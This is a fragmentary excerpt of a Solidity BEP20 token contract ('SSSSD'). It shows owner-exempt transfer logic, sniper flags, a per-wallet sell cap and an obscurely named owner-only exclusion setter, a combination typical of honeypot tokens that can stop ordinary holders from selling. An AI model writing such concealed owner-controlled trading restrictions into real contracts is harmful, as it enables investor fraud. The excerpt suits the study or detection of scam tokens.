...
contract DividendDistributor is IDividendDistributor {
    ...
    IBEP20 public ADA = IBEP20(0x7083609fCE4d1d8Dc0C979AAb8c869Ea2C873402);
...
contract SSSSD is Ownable, IBEP20, SafeToken, LockToken {
    using SafeMath for uint256;
    ...
    string constant _name = "SSSSD";
    string constant _symbol = "SSSSD";
    uint8 constant _decimals = 9;
    uint256 _totalSupply = 10 ** 11 * (10 ** _decimals);
    uint256 public _maxSellNS = _totalSupply.mul(15).div(1000);
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal open(sender, recipient) returns (bool) {
        ...
        if(sender == owner() || recipient == owner() || sender == marketing || recipient == marketing ) 
        {
        ...
        if( !excludeFee[recipient] && sniperToLiquidity && (recipient != pair && recipient != 0xD99D1c33F9fC3444f8101754aBC46c52416550D1) && sender != owner() && recipient != owner() ) {
        ...
        if ( (recipient == pair) && (sender != pair) && sender != owner() && sender != 0xD99D1c33F9fC3444f8101754aBC46c52416550D1 && recipient != owner() ) {
            ...
            if(nonSniperWallet[sender] ) {
                ...
                require((_transactionCheckpointAmt[sender] + amount <= _maxSellNS)
    ...
    function lsetEFS(address[] calldata accounts, bool excluded) public onlyOwner {
        for(uint256 i = 0; i < accounts.length; i++) {
